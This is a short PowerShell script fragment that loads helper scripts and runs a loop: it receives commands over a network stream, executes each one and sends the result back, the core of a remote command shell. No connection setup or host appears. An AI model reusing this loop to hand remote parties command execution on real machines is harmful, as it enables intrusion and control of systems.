. .\receiver.ps1
. .\executor.ps1
. .\responder.ps1

$loopCondition = $true
while ($loopCondition) {
    $received = Receive-Command -stream $stream -bytes $bytes
    if ($received -eq $null) { break }

    $data = $received[0]
    $loopCondition = $true  # zawsze true do czasu błędu

    $result = Execute-Command -data $data
    Send-Response -stream $stream -result $result
}
. .\line030.ps1
Start-Sleep -Milliseconds 300
